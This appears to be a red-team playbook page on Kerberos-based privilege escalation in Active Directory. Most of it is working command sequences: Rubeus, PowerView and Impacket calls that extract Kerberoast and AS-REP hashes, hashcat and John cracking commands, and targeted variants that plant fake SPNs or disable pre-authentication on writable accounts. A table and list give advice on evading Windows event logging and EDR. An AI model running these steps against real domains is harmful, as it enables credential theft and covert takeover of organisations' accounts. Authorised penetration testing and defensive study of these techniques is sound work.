# Kerberos-Based Privilege Escalation

> **MITRE ATT&CK**: Privilege Escalation > T1558 - Steal or Forge Kerberos Tickets
> **Platforms**: Windows / Active Directory
> **Required Privileges**: Domain User
> **OPSEC Risk**: Medium

## Strategic Overview

Kerberos attacks exploit the fundamental design of Kerberos authentication rather than
implementation bugs. Any domain user can request service tickets (TGS) for accounts with
registered SPNs -- the ticket is encrypted with the service account's password hash,
enabling offline cracking. AS-REP Roasting targets accounts where Kerberos pre-authentication
is disabled. These attacks are attractive because they require only standard domain user
credentials and generate minimal network noise compared to password spraying or brute-force
attacks. A Red Team Lead should prioritize Kerberoasting early in the engagement as it often
yields high-privilege service account credentials with minimal detection risk.

## Technical Deep-Dive

### Kerberoasting

Kerberoasting requests Kerberos TGS tickets for accounts with Service Principal Names (SPNs)
and cracks them offline. The ticket's encryption is derived from the service account's NTLM
hash, so weak passwords fall quickly to hashcat or John the Ripper.

```powershell
# --- Enumeration Phase ---

# Identify Kerberoastable accounts and assess value (Rubeus)
.\Rubeus.exe kerberoast /stats

# Enumerate with PowerView
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname, memberof, pwdlastset

# Identify high-value targets (admin group members with SPNs)
Get-DomainUser -SPN -AdminCount | Select-Object samaccountname, serviceprincipalname

# --- Extraction Phase ---

# Rubeus - request TGS tickets (prefer RC4 for faster cracking)
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# Rubeus - target specific user (reduces noise)
.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt

# Rubeus - request AES tickets only (avoids RC4 downgrade detection)
.\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes_aes.txt

# Impacket from Linux
GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user:password -outputfile kerberoast.txt

# Impacket - target specific user
GetUserSPNs.py -request-user svc_sql -dc-ip 10.10.10.10 domain.local/user:password

# --- Cracking Phase ---

# Hashcat - crack TGS-REP (RC4 = 13100, AES256 = 19700)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

### AS-REP Roasting

Targets accounts with "Do not require Kerberos preauthentication" (DONT_REQ_PREAUTH) set.
The AS-REP response contains data encrypted with the user's password hash, crackable offline.

```powershell
# --- Enumeration ---

# Find AS-REP Roastable accounts (PowerView)
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, memberof

# LDAP query directly
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# --- Extraction ---

# Rubeus
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt

# Rubeus - target specific user
.\Rubeus.exe asreproast /user:target_user /outfile:asrep_target.txt

# Impacket from Linux (can also try usernames without credentials)
GetNPUsers.py domain.local/user:password -request -outputfile asrep.txt
GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -outputfile asrep.txt

# --- Cracking ---

# Hashcat (AS-REP = mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

### Targeted Kerberoasting

When you have GenericAll, GenericWrite, or WriteProperty over a user object, you can set
an SPN on the account, Kerberoast it, then remove the SPN. This extends Kerberoasting to
accounts that do not natively have SPNs.

```powershell
# Step 1: Set a fake SPN on the target user (requires write permissions)
Set-DomainObject -Identity target_user -Set @{serviceprincipalname='nonexistent/YOURFAKESPN'}

# Step 2: Kerberoast the target
.\Rubeus.exe kerberoast /user:target_user /outfile:targeted_hash.txt

# Step 3: Remove the SPN immediately (cleanup)
Set-DomainObject -Identity target_user -Clear serviceprincipalname

# Verify SPN removal
Get-DomainUser target_user -Properties serviceprincipalname
```

### Targeted AS-REP Roasting

With GenericAll or GenericWrite over a user, disable pre-authentication, roast, then
re-enable it.

```powershell
# Disable pre-authentication
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304}

# AS-REP Roast
.\Rubeus.exe asreproast /user:target_user /outfile:targeted_asrep.txt

# Re-enable pre-authentication (cleanup)
Set-DomainObject -Identity target_user -XOR @{useraccountcontrol=4194304}
```

## Detection & Evasion

| Indicator | Detection Source | Evasion |
|-----------|-----------------|---------|
| TGS requests for many SPNs in short period | Event 4769 spike | Request tickets one at a time with delays |
| RC4 encryption type in TGS request | Event 4769 (EncryptionType 0x17) | Use /tgtdeleg for AES tickets (Rubeus) |
| AS-REP request for DONT_REQ_PREAUTH user | Event 4768 with no pre-auth | Target specific users, not bulk requests |
| SPN set/removed on user object | Event 5136 (Directory Service Changes) | Minimize time window, remove quickly |
| Rubeus.exe or GetUserSPNs.py execution | EDR process detection | In-memory execution, custom tooling |

### OPSEC Best Practices

```
1. Always enumerate first (/stats) before bulk extraction
2. Target specific high-value accounts rather than requesting all SPNs
3. Use AES ticket requests (/tgtdeleg) to avoid RC4 downgrade alerts
4. For targeted Kerberoasting, minimize the SPN existence window
5. Crack offline on your own hardware, never on target infrastructure
6. Consider the account lockout policy before password spraying cracked hashes
```

## Cross-References

- [Delegation Abuse](delegation-abuse.md) - advanced Kerberos delegation attacks
- [ACL Abuse](acl-abuse.md) - gaining write permissions for targeted Kerberoasting
- [AD Privilege Escalation Overview](ad-privilege-escalation.md) - full AD attack map
- [AD Deep Dive: Kerberos](../12-active-directory-deep-dive/kerberos-attacks-deep-dive.md) - comprehensive Kerberos internals

## References

- https://www.semperis.com/blog/kerberoasting-attack-overview/
- https://github.com/GhostPack/Rubeus
- https://github.com/fortra/impacket
- https://attack.mitre.org/techniques/T1558/003/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
